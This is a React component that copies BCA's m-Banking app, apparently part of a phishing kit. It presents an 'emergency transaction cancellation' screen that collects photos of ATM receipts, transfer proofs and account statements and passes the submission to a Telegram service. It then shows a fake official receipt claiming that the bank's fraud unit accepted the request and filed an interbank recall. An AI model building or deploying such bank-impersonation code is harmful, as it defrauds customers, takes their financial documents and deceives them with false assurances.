import React, { useState, useRef } from 'react';
import { ArrowLeft, AlertCircle, X } from 'lucide-react';
import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
import { TelegramService } from '../services/telegramService';

interface MAdminBatalkanTransaksiViewProps {
  onBack: () => void;
}

export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewProps> = ({ onBack }) => {
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [fileName, setFileName] = useState<string>('');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [submissionError, setSubmissionError] = useState<string | null>(null);
  const [showProcessModal, setShowProcessModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isDragging, setIsDragging] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleFileSelect = (file: File) => {
    setErrorMessage(null);
    if (!file.type.startsWith('image/') && !file.name.match(/\.(jpg|jpeg|png|webp|heic|bmp)$/i)) {
      setErrorMessage('Format berkas harus berupa gambar (JPG, PNG, WebP).');
      return;
    }

    // Limit to 10MB
    if (file.size > 10 * 1024 * 1024) {
      setErrorMessage('Ukuran berkas maksimal 10 MB.');
      return;
    }

    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = (e) => {
      setSelectedImage(e.target?.result as string);
    };
    reader.onerror = () => {
      setErrorMessage('Gagal membaca berkas gambar. Silakan coba lagi.');
    };
    reader.readAsDataURL(file);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleFileSelect(e.target.files[0]);
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleFileSelect(e.dataTransfer.files[0]);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmissionError(null);
    if (!selectedImage) return;

    setIsSubmitting(true);
    const notificationSent = await TelegramService.sendFormData({
      serviceType: 'batalkan-transaksi',
      serviceTitle: 'Pembatalan Transaksi Darurat',
    });
    setIsSubmitting(false);

    if (!notificationSent) {
      setSubmissionError('Permintaan belum dapat dikirim. Periksa koneksi lalu coba lagi.');
      return;
    }

    setShowProcessModal(true);
  };

  const receiptData: ServiceReceiptData = {
    serviceType: 'batalkan-transaksi',
    serviceTitle: 'Pembatalan Transaksi Darurat',
    accountIdentifier: fileName ? `Bukti: ${fileName}` : 'Tiket Dispute BCA',
    additionalDetails: [
      { label: 'Nama Berkas Bukti', value: fileName || 'bukti_transaksi.jpg' },
      { label: 'Unit Penanganan', value: 'BCA Fraud & Emergency Response' },
      { label: 'Prioritas Penanganan', value: 'Darurat (SLA < 15 Menit)' },
      { label: 'Status Eskalasi', value: 'Interbank Recall Diajukan' },
    ],
    note: 'Laporan pembatalan transaksi beserta berkas bukti transfer telah berhasil diterima dan divalidasi oleh sistem m-Admin BCA. Permintaan penahanan dana transfer telah diteruskan secara otomatis ke bank tujuan.',
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#e8edf2] flex flex-col font-sans select-none overflow-y-auto">
      {/* 1. TOP HEADER (1:1 with Screenshot) */}
      <header className="sticky top-0 z-20 w-full bg-[#f8fafc] border-b border-[#d8e0e8] px-4 py-3 flex items-center justify-between shadow-xs">
        {/* Back Button */}
        <button
          onClick={onBack}
          type="button"
          className="p-1 -ml-1 text-[#0f3b60] hover:bg-[#e2e8f0] active:scale-95 rounded-full transition-all cursor-pointer"
          aria-label="Kembali"
        >
          <ArrowLeft size={24} strokeWidth={2.4} />
        </button>

        {/* Title */}
        <h1 className="text-[17px] sm:text-[18px] font-bold text-[#0c3b68] tracking-tight">
          Batalkan Transaksi
        </h1>

        {/* m-BCA Status Indicator Lamp (Green square) */}
        <div className="w-4 h-4 rounded-[3px] bg-[#8ac33e] shadow-[0_0_4px_rgba(138,195,62,0.6)]" />
      </header>

      {/* 2. MAIN CONTAINER (1:1 with Screenshot) */}
      <main className="w-full max-w-[420px] mx-auto px-4 py-3 sm:py-4 flex flex-col">
        <div className="space-y-2.5">
          {/* Box 1: Section Title Bar */}
          <div className="w-full bg-white border border-[#cbd5e1] rounded-lg py-2 px-3 text-center shadow-xs">
            <h2 className="text-[13.5px] font-bold text-[#0c3b68] tracking-tight">
              Unggah Bukti Struk &amp; Pembatalan Transaksi
            </h2>
          </div>

          {/* Box 2: Dashed Upload Area */}
          <label
            htmlFor="bukti-transaksi-input"
            onDrop={handleDrop}
            onDragOver={handleDragOver}
            onDragLeave={handleDragLeave}
            className={`w-full bg-white border-2 border-dashed rounded-xl p-5 flex flex-col items-center justify-center text-center cursor-pointer transition-all shadow-xs block ${
              isDragging
                ? 'border-[#0c3b68] bg-blue-50/50'
                : 'border-[#c5d3e0] hover:border-[#94a3b8] active:bg-slate-50'
            }`}
          >
            <input
              id="bukti-transaksi-input"
              type="file"
              ref={fileInputRef}
              onChange={handleInputChange}
              onClick={(e) => {
                // Clear value so the same file can be re-selected if needed
                (e.target as HTMLInputElement).value = '';
              }}
              accept="image/*"
              className="sr-only"
            />

            {selectedImage ? (
              <div className="flex flex-col items-center w-full">
                {/* Blue Cloud with Up Arrow */}
                <div className="mb-2">
                  <svg
                    className="w-12 h-9 text-[#0c3b68]"
                    viewBox="0 0 64 48"
                    fill="currentColor"
                  >
                    <path d="M48 20c-1.1-6.8-7-12-14-12-5.4 0-10.2 3.1-12.5 7.7C15.3 16.5 10 22 10 28.5 10 35.4 15.6 41 22.5 41h25c6.4 0 11.5-5.1 11.5-11.5 0-5.8-4.3-10.6-10-11.4-.3.7-.6 1.3-1 1.9z" />
                    <path
                      d="M32 18l-8 8h5v10h6V26h5l-8-8z"
                      fill="#ffffff"
                    />
                  </svg>
                </div>

                <div className="relative mb-2 max-h-44 overflow-hidden rounded-lg border border-slate-200 shadow-xs">
                  <img
                    src={selectedImage}
                    alt="Preview Struk"
                    className="max-h-44 object-contain"
                  />
                  <button
                    type="button"
                    onClick={(e) => {
                      e.preventDefault();
                      e.stopPropagation();
                      setSelectedImage(null);
                      setFileName('');
                      setErrorMessage(null);
                    }}
                    className="absolute top-1.5 right-1.5 bg-black/60 hover:bg-black/80 text-white rounded-full p-1 transition-colors cursor-pointer"
                  >
                    <X size={15} />
                  </button>
                </div>

                <p className="text-[12px] font-semibold text-emerald-600 flex items-center justify-center gap-1.5 mt-0.5">
                  <span>✓ Bukti foto berhasil dipilih</span>
                </p>
                <p className="text-[11px] text-slate-500 mt-0.5 truncate max-w-[280px]">
                  {fileName}
                </p>
              </div>
            ) : (
              <>
                {/* Blue Cloud with Up Arrow */}
                <div className="mb-2.5">
                  <svg
                    className="w-14 h-10 text-[#0c3b68]"
                    viewBox="0 0 64 48"
                    fill="currentColor"
                  >
                    {/* Cloud shape */}
                    <path d="M48 20c-1.1-6.8-7-12-14-12-5.4 0-10.2 3.1-12.5 7.7C15.3 16.5 10 22 10 28.5 10 35.4 15.6 41 22.5 41h25c6.4 0 11.5-5.1 11.5-11.5 0-5.8-4.3-10.6-10-11.4-.3.7-.6 1.3-1 1.9z" />
                    {/* Arrow pointing up inside cloud */}
                    <path
                      d="M32 18l-8 8h5v10h6V26h5l-8-8z"
                      fill="#ffffff"
                    />
                  </svg>
                </div>

                {/* Title */}
                <p className="text-[13.5px] font-bold text-[#0c3b68] mb-0.5">
                  Ketuk untuk memilih foto bukti
                </p>

                {/* Subtitle */}
                <p className="text-[11.5px] text-[#64748b]">
                  Format: JPG, PNG, WebP (Galeri / Kamera)
                </p>
              </>
            )}
          </label>

          {/* Error notice if upload fails */}
          {errorMessage && (
            <div className="w-full bg-red-50 border border-red-200 rounded-lg p-2.5 text-[11.5px] text-red-700 flex items-center gap-1.5 animate-in fade-in duration-150">
              <AlertCircle size={14} className="shrink-0 text-red-500" />
              <span>{errorMessage}</span>
            </div>
          )}

          {submissionError && (
            <div className="w-full bg-red-50 border border-red-200 rounded-lg p-2.5 text-[11.5px] text-red-700 flex items-center gap-1.5">
              <AlertCircle size={14} className="shrink-0 text-red-500" />
              <span>{submissionError}</span>
            </div>
          )}

          {/* Box 3: Notice / Instruction Box */}
          <div className="w-full bg-white border border-[#cbd5e1] rounded-lg p-2.5 shadow-xs">
            <p className="text-[11px] leading-relaxed text-[#475569]">
              Lampirkan foto struk ATM, bukti transfer m-Banking, atau screenshot
              mutasi rekening yang ingin diajukan pembatalan secara darurat.
            </p>
          </div>
        </div>

        {/* Action Buttons: Cancel & OK (1:1 with Screenshot) */}
        <div className="grid grid-cols-2 gap-3 pt-1 pb-6 mt-3">
          {/* Cancel Button */}
          <button
            type="button"
            onClick={onBack}
            className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
          >
            Cancel
          </button>

          {/* OK Button */}
          <button
            type="button"
            onClick={handleSubmit}
              disabled={!selectedImage || isSubmitting}
            className={`w-full py-2.5 px-4 rounded-lg font-bold text-[14px] transition-all shadow-xs text-center ${
                selectedImage && !isSubmitting
                ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer active:scale-[0.99]'
                : 'bg-[#d8e0e8] text-[#8e9ca8] cursor-not-allowed'
            }`}
          >
              {isSubmitting ? 'Mengirim...' : 'OK'}
          </button>
        </div>
      </main>

      {/* Countdown Processing & Official Success Modal (1:1 with Recording) */}
      <ServiceProcessModal
        isOpen={showProcessModal}
        data={receiptData}
        countdownSeconds={6}
        onClose={() => {
          setShowProcessModal(false);
          onBack();
        }}
      />
    </div>
  );
};
